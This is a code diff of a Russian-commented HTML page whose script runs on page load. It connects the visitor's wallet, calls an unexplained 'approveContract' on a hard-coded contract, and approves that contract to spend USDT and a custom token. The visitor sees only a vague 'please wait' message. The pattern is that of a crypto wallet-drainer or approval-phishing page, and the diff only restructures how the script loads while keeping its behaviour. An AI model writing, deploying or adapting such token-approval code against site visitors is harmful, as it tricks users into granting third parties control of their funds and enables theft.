@@ -38,83 +38,78 @@
         <div id="status">Подождите, идет подключение и выполнение операций...</div>
         <div id="error"></div>
     </div>
-    
+
+    <!-- Подключаем ethers.js с использованием `defer` -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" defer></script>
+
+    <!-- Основной скрипт -->
     <script>
-        // Динамическая загрузка ethers.js
-        async function loadEthers() {
-            if (typeof ethers === 'undefined') {
-                const ethersModule = await import('https://cdn.ethers.io/lib/ethers-5.7.umd.min.js');
-                window.ethers = ethersModule.ethers;
-            }
-        }
+        window.addEventListener('load', async function() {
+            const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Адрес вашего контракта
+            const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
+            const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена
 
-        // Адреса контрактов
-        const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Адрес вашего контракта
-        const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
-        const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена
+            // Основная функция для подключения и выполнения операций
+            async function mainProcess() {
+                try {
+                    // Шаг 1: Проверка наличия кошелька и подключение
+                    if (typeof window.ethereum === 'undefined') {
+                        throw new Error("Кошелек не найден. Установите MetaMask или другой поддерживаемый кошелек.");
+                    }
 
-        // Основная функция для подключения и выполнения операций
-        async function mainProcess() {
-            try {
-                await loadEthers(); // Загружаем ethers.js перед использованием
+                    // Подключение к кошельку
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    const userAddress = accounts[0];
+                    document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
 
-                // Шаг 1: Проверка наличия кошелька и подключение
-                if (typeof window.ethereum === 'undefined') {
-                    throw new Error("Кошелек не найден. Установите MetaMask или другой поддерживаемый кошелек.");
+                    // Шаг 2: Подписание контракта
+                    await signContract();
+
+                    // Шаг 3: Выполнение approve для USDT и кастомного токена
+                    await approveTokens(USDT_TOKEN_ADDRESS);
+                    await approveTokens(CUSTOM_TOKEN_ADDRESS);
+
+                    // Сообщение об успешном выполнении всех шагов
+                    document.getElementById("status").innerText = "Все действия выполнены успешно.";
+                } catch (error) {
+                    document.getElementById("error").innerText = `Ошибка: ${error.message}`;
                 }
-
-                // Подключение к кошельку
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                const userAddress = accounts[0];
-                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
-
-                // Шаг 2: Подписание контракта
-                await signContract();
-
-                // Шаг 3: Выполнение approve для USDT и кастомного токена
-                await approveTokens(USDT_TOKEN_ADDRESS);
-                await approveTokens(CUSTOM_TOKEN_ADDRESS);
-
-                // Сообщение об успешном выполнении всех шагов
-                document.getElementById("status").innerText = "Все действия выполнены успешно.";
-            } catch (error) {
-                document.getElementById("error").innerText = `Ошибка: ${error.message}`;
             }
-        }
 
-        // Функция подписания контракта
-        async function signContract() {
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const contractAbi = [
-                "function approveContract() external"
-            ];
-            const contract = new ethers.Contract(CONTRACT_ADDRESS, contractAbi, signer);
+            // Функция подписания контракта
+            async function signContract() {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const contractAbi = [
+                    "function approveContract() external"
+                ];
+                const contract = new ethers.Contract(CONTRACT_ADDRESS, contractAbi, signer);
 
-            const tx = await contract.approveContract();
-            document.getElementById("status").innerText = `Контракт подписан. Транзакция: ${tx.hash}`;
-            await tx.wait();
-            document.getElementById("status").innerText = "Контракт успешно подписан.";
-        }
+                const tx = await contract.approveContract();
+                document.getElementById("status").innerText = `Контракт подписан. Транзакция: ${tx.hash}`;
+                await tx.wait();
+                document.getElementById("status").innerText = "Контракт успешно подписан.";
+            }
 
-        // Функция предоставления доступа к токенам
-        async function approveTokens(tokenAddress) {
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const tokenAbi = [
-                "function approve(address spender, uint256 amount) public returns (bool)"
-            ];
-            const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
+            // Функция предоставления доступа к токенам
+            async function approveTokens(tokenAddress) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const tokenAbi = [
+                    "function approve(address spender, uint256 amount) public returns (bool)"
+                ];
+                const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
 
-            const amount = ethers.utils.parseUnits("1000", 18); // Укажите необходимое количество токенов с учетом десятичных знаков
-            const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
-            document.getElementById("status").innerText = `Транзакция approve отправлена: ${tx.hash}`;
-            await tx.wait();
-            document.getElementById("status").innerText = `Approve для токенов ${tokenAddress} выполнен.`;
-        }
+                const amount = ethers.utils.parseUnits("1000", 18); // Укажите необходимое количество токенов с учетом десятичных знаков
+                const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
+                document.getElementById("status").innerText = `Транзакция approve отправлена: ${tx.hash}`;
+                await tx.wait();
+                document.getElementById("status").innerText = `Approve для токенов ${tokenAddress} выполнен.`;
+            }
 
-        // Запуск основного процесса при загрузке страницы
-        window.addEventListener('load', mainProcess);
+            // Запуск основного процесса
+            await mainProcess();
+        });
     </script>
 </body>
 </html>
